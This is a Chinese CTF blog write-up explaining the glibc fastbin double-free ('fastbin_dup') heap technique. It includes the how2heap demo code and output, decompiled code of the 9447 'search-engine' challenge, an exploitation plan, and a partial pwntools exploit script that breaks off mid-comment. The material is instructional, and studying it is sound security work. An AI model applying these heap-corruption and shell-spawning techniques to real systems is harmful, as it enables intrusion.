<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>Introduction to pwn2.1-fastbin_dup | Room of Equirement | pwn what you want</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="pwn,heap">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Sirius Whiter</h5>
          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
            
              <span>x</span>
            
              <span>u</span>
            
              <span>e</span>
            
              <span>w</span>
            
              <span>e</span>
            
              <span>n</span>
            
              <span>j</span>
            
              <span>i</span>
            
              <span>e</span>
            
              <span>2</span>
            
              <span>0</span>
            
              <span>1</span>
            
              <span>7</span>
            
              <span>@</span>
            
              <span>o</span>
            
              <span>u</span>
            
              <span>t</span>
            
              <span>l</span>
            
              <span>o</span>
            
              <span>o</span>
            
              <span>k</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/siriuswhiter" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/siriuswhiter" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        
	
<header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>Introduction to pwn2.1-fastbin_dup</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">Introduction to pwn2.1-fastbin_dup</h1>
        <h5 class="subtitle">
            
                <time datetime="2018-10-15T11:14:55.000Z" itemprop="datePublished" class="page-time">
  2018-10-15
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>




<div class="container body-wrap">
    <article id="post-introduction-to-pwn2-1-fastbin-dup"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">Introduction to pwn2.1-fastbin_dup</h1>
        <div class="post-meta">
            <time class="post-time" title="2018-10-15 19:14:55" datetime="2018-10-15T11:14:55.000Z"  itemprop="datePublished">2018-10-15</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/pwn/">pwn</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p><em>尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。</em></p>
<h1 id="fastbin-dup原理"><a href="#fastbin-dup原理" class="headerlink" title="fastbin_dup原理"></a>fastbin_dup原理</h1><p>利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。<br>产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p>
<p>可以用how2heap的例子来理解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><span class="line">	       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</span><br><span class="line"></span><br><span class="line">	unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">	int *a = malloc(8);</span><br><span class="line">	int *b = malloc(8);</span><br><span class="line">	int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">	// free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">	free(b);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><span class="line">		&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</span><br><span class="line">	unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);</span><br><span class="line">	fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><span class="line">		&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><span class="line">		&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><span class="line">		&quot;return a pointer to it.\n&quot;, a);</span><br><span class="line">	stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</span><br><span class="line">	*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> ./fastbin_dup_into_stack </span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffe1abfa870.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">3rd malloc(8): 0x56317e17e2a0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x56317e17e260 again, things will crash because 0x56317e17e260 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x56317e17e280.</span><br><span class="line">Now, we can free 0x56317e17e260 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x56317e17e260, 0x56317e17e280, 0x56317e17e260 ]. We&apos;ll now carry out our attack by modifying data at 0x56317e17e260.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">Now the free list has [ 0x56317e17e260 ].</span><br><span class="line">Now, we have access to 0x56317e17e260 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x56317e17e260 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x56317e17e260, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffe1abfa860</span><br></pre></td></tr></table></figure>
<p>可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置，例如chunk4就被分配到了栈里。</p>
<h1 id="例题-9447-search-engine"><a href="#例题-9447-search-engine" class="headerlink" title="例题-9447-search-engine"></a>例题-9447-search-engine</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1: Search with a word&quot;);</span><br><span class="line">  puts(&quot;2: Index a sentence&quot;);</span><br><span class="line">  return puts(&quot;3: Quit&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>inde a sentence.程序写的很复杂，看起来很揪心。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">int index_a_sentence()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  __int64 v1; // rbp</span><br><span class="line">  int v2; // er13</span><br><span class="line">  char *v3; // r12</span><br><span class="line">  signed __int64 v4; // rbx</span><br><span class="line">  signed __int64 v5; // rbp</span><br><span class="line">  _DWORD *v6; // rax</span><br><span class="line">  int v7; // edx</span><br><span class="line">  __int64 v8; // rdx</span><br><span class="line">  __int64 v10; // rdx</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the sentence size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  v1 = (unsigned int)(v0 - 1);</span><br><span class="line">  v2 = v0;</span><br><span class="line">  if ( (unsigned int)v1 &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the sentence:&quot;);</span><br><span class="line">  v3 = (char *)malloc(v2);</span><br><span class="line">  read_until_newline((__int64)v3, v2, 0);</span><br><span class="line">  v4 = (signed __int64)(v3 + 1);</span><br><span class="line">  v5 = (signed __int64)&amp;v3[v1 + 2];</span><br><span class="line">  v6 = malloc(0x28uLL);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  *(_QWORD *)v6 = v3;</span><br><span class="line">  v6[2] = 0;</span><br><span class="line">  *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">  v6[6] = v2;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( *(_BYTE *)(v4 - 1) != 32 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[2] = ++v7;</span><br><span class="line">LABEL_4:</span><br><span class="line">      if ( ++v4 == v5 )</span><br><span class="line">        goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = qword_6020B8;</span><br><span class="line">      qword_6020B8 = (__int64)v6;</span><br><span class="line">      *((_QWORD *)v6 + 4) = v10;</span><br><span class="line">      v6 = malloc(0x28uLL);</span><br><span class="line">      v7 = 0;</span><br><span class="line">      *(_QWORD *)v6 = v4;</span><br><span class="line">      v6[2] = 0;</span><br><span class="line">      *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">      v6[6] = v2;</span><br><span class="line">      goto LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)v6 = v4++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 != v5 );</span><br><span class="line">LABEL_8:</span><br><span class="line">  if ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = qword_6020B8;</span><br><span class="line">    qword_6020B8 = (__int64)v6;</span><br><span class="line">    *((_QWORD *)v6 + 4) = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    free(v6);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Added sentence&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>search word：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">void search_with_a_word()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebp</span><br><span class="line">  void *v1; // r12</span><br><span class="line">  __int64 i; // rbx</span><br><span class="line">  char v3; // [rsp+0h] [rbp-38h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the word size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( (unsigned int)(v0 - 1) &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the word:&quot;);</span><br><span class="line">  v1 = malloc(v0);</span><br><span class="line">  read_until_newline((__int64)v1, v0, 0);</span><br><span class="line">  for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( **(_BYTE **)(i + 16) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24));</span><br><span class="line">        fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout);</span><br><span class="line">        putchar(10);</span><br><span class="line">        puts(&quot;Delete this sentence (y/n)?&quot;);</span><br><span class="line">        read_until_newline((__int64)&amp;v3, 2, 1);</span><br><span class="line">        if ( v3 == 121 )</span><br><span class="line">        &#123;</span><br><span class="line">          memset(*(void **)(i + 16), 0, *(signed int *)(i + 24));</span><br><span class="line">          free(*(void **)(i + 16));</span><br><span class="line">          puts(&quot;Deleted!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  free(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>get_num：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 get_num()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  char *endptr; // [rsp+8h] [rbp-50h]</span><br><span class="line">  char nptr; // [rsp+10h] [rbp-48h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+48h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  read_until_newline((__int64)&amp;nptr, 48, 1);</span><br><span class="line">  result = strtol(&amp;nptr, &amp;endptr, 0);</span><br><span class="line">  if ( endptr == &amp;nptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(1LL, &quot;%s is not a valid number\n&quot;, &amp;nptr);</span><br><span class="line">    result = get_num();</span><br><span class="line">  &#125;</span><br><span class="line">  __readfsqword(0x28u);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，<br>所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。</p>
<p>整个过程大概是以一个结构体来保存每个单词：(40个字节)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">struct words_struct </span><br><span class="line">&#123; </span><br><span class="line">  addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) </span><br><span class="line">  int64_t size; // 单词大小 </span><br><span class="line">  addr* ptr_to_sentences; //单词所在的句子字符串的位置 </span><br><span class="line">  int64_t* size_of_sentences;//句子长度 </span><br><span class="line">  words_struct* next_word;//链表下一个节点指针 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。<br>在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \x00 ，由于单词结构体中存储的单词只是句子的一个指针，<br>所以单词也会被置为 \x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。<br>看起来由于句子内容被置为 \x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，<br>当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。<br>此外，当句子被 memset 的时候，单词虽然都变为了 \x00 ，但是我们仍然可以通过两个 \x00 的比较来绕过 memcmp 的检测。</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>1) 利用get_num函数的漏洞试图泄露栈地址<br>2) 泄露libc_address，从而计算出system 和 /bin/sh的地址<br>3) 利用fastbin_dup 进行double free<br>4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”)</p>
<p><em>思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样</em></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span><br><span class="line"></span><br><span class="line">p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)</span><br><span class="line"></span><br><span class="line"># binsh_offset 找不到</span><br><span class="line">pop_rdi_ret = 0x400e23</span><br><span class="line">system_offset = 0x46590</span><br><span class="line">puts_offset = 0x6fd60</span><br><span class="line">binsh_offset = 1558723</span><br><span class="line"></span><br><span class="line">def leak_stack():</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    p.recvuntil(&apos;Quit\n&apos;)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line">    # doesn&apos;t work all the time</span><br><span class="line">    p.sendline(&apos;A&apos;*48)</span><br><span class="line">    leak = p.recvline().split(&apos; &apos;)[0][48:]</span><br><span class="line">    return int(leak[::-1].encode(&apos;hex&apos;), 16)</span><br><span class="line"></span><br><span class="line">def leak_libc():</span><br><span class="line">    # this sentence is the same size as a list node</span><br><span class="line">    index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;))</span><br><span class="line"></span><br><span class="line">    # delete the sentence</span><br><span class="line">    search(&apos;a&apos; * 12)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line"></span><br><span class="line">    # the node for this sentence gets put in the previous sentence&apos;s spot.</span><br><span class="line">    # note we made sure this doesn&apos;t reuse the chunk that was just freed by</span><br><span class="line">    # making it 64 bytes</span><br><span class="line">    index_sentence(&apos;d&apos; * 64)</span><br><span class="line"></span><br><span class="line">    # free the first sentence again so we can allocate something on top of it.</span><br><span class="line">    # this will work because 1) the sentence no longer starts with a null byte</span><br><span class="line">    # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2)</span><br><span class="line">    # the location where our original string contained `b` is guaranteed to be</span><br><span class="line">    # zero. this is because after the original sentence was zeroed out, nothing</span><br><span class="line">    # was allocated at offset 12, which is just padding in the structure. if</span><br><span class="line">    # we had made the first word in the string 16 bytes instead of 12, then that</span><br><span class="line">    # 